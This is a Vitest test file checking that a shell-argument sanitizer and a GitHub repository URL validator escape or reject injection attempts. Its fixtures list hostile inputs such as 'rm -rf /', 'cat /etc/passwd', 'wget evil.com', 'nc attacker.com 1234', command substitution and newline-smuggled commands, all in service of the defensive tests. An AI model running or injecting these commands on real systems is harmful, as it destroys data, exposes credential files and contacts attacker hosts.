import { describe, expect, it } from "vitest";
import { sanitizeShellArgument, validateGitHubRepoUrl } from "./sanitization";

describe("sanitizeShellArgument", () => {
  it("should escape shell metacharacters", () => {
    const dangerous = [
      "; rm -rf /",
      "&& cat /etc/passwd",
      "|| wget evil.com",
      "| nc attacker.com 1234",
      "`whoami`",
      "$(whoami)",
      "$HOME/evil",
    ];

    dangerous.forEach((input) => {
      const result = sanitizeShellArgument(input);
      expect(result).toBeDefined();
      expect(typeof result).toBe("string");
      // shell-quote should properly escape these
      expect(result).not.toBe(input);
    });
  });

  it("should handle safe strings", () => {
    const safe = ["agent-123", "my-agent", "simple-message"];
    safe.forEach((input) => {
      const result = sanitizeShellArgument(input);
      expect(result).toBeDefined();
      expect(typeof result).toBe("string");
    });
  });

  it("should handle special characters", () => {
    const result = sanitizeShellArgument("agent with spaces");
    expect(result).toBeDefined();
    expect(typeof result).toBe("string");
  });

  it("should handle empty string", () => {
    const result = sanitizeShellArgument("");
    expect(result).toBeDefined();
  });
});

describe("validateGitHubRepoUrl", () => {
  it("should accept valid repository names", () => {
    expect(validateGitHubRepoUrl("continuedev/continue")).toBe(true);
    expect(validateGitHubRepoUrl("owner/repo")).toBe(true);
    expect(validateGitHubRepoUrl("owner-name/repo-name")).toBe(true);
    expect(validateGitHubRepoUrl("https://github.com/owner/repo")).toBe(true);
    expect(validateGitHubRepoUrl("git@github.com:owner/repo.git")).toBe(true);
  });

  it("should reject path traversal", () => {
    expect(validateGitHubRepoUrl("../../../etc/passwd")).toBe(false);
    expect(validateGitHubRepoUrl("owner/../evil")).toBe(false);
  });

  it("should reject command injection attempts", () => {
    expect(validateGitHubRepoUrl("owner/repo; rm -rf /")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo && cat /etc/passwd")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo || wget evil.com")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo | nc attacker")).toBe(false);
  });

  it("should reject shell metacharacters", () => {
    expect(validateGitHubRepoUrl("owner/$(whoami)")).toBe(false);
    expect(validateGitHubRepoUrl("owner/`whoami`")).toBe(false);
    expect(validateGitHubRepoUrl("$EVIL/repo")).toBe(false);
  });

  it("should reject shell redirection", () => {
    expect(validateGitHubRepoUrl("owner/repo > /dev/null")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo < /etc/passwd")).toBe(false);
  });

  it("should reject newlines", () => {
    expect(validateGitHubRepoUrl("owner/repo\nrm -rf /")).toBe(false);
    expect(validateGitHubRepoUrl("owner/repo\rrm -rf /")).toBe(false);
  });

  it("should reject empty or invalid input", () => {
    expect(validateGitHubRepoUrl("")).toBe(false);
    expect(validateGitHubRepoUrl("   ")).toBe(false);
    expect(validateGitHubRepoUrl(null as any)).toBe(false);
    expect(validateGitHubRepoUrl(undefined as any)).toBe(false);
  });
});
